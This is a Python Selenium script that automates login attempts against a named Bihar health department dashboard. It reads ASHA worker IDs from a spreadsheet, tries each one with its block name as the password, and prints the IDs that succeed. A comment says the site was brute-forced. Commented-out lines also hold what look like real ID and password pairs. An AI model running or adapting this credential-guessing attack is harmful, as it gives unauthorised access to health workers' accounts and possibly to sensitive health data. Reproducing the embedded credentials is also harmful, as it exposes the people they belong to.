import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time

def check_login_success(username, password):

    driver = webdriver.Chrome()
    

    driver.get("https://ashadashboard.bhavyabiharhealth.in/#/auth/login")      #this is site where we brute-forced to check where user id and password is correct or not 
    
    try:
     
        username_field = driver.find_element(By.NAME, "username")        #it will take username attribute from login page
        password_field = driver.find_element(By.NAME, "password")        #it will take password attribute from login page

       
        username_field.send_keys(username)                     #it will send the username and password 
        password_field.send_keys(password)                     #which is recieved bu check_login_success function to login page

        sign_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'btn-primary')]"))
        )
        driver.execute_script("arguments[0].scrollIntoView(true);", sign_button)
        time.sleep(1)  

        # Javascript
        driver.execute_script("arguments[0].click();", sign_button)

        # Waiting to loading all content in page
        time.sleep(5)
        if driver.current_url == "https://ashadashboard.bhavyabiharhealth.in/#/auth/login":
            
            error_message = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Invalid')]"))
            )
            if error_message:
                return 0  

        # Alternative way
        success_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Dashboard')]"))
        )
        
        return 1


    except Exception as e:
        return 0

    finally:
       
        driver.quit()


# user_name = "A30122097"
# pass_word = "Athmalgola12345"

df=pd.read_excel('asha_credentials.xlsx')
count=0

for index,row in df.iterrows():
    password=row['Block_Name']
    asha_id=row['ASHA_ID']
    login_result = check_login_success(asha_id, password)
    if(login_result==1):
       print(f"{count} and Asha ID : { asha_id}")
    count+=1  
       
# login_result = check_login_success('F07000838','AF123456')
# print(login_result)

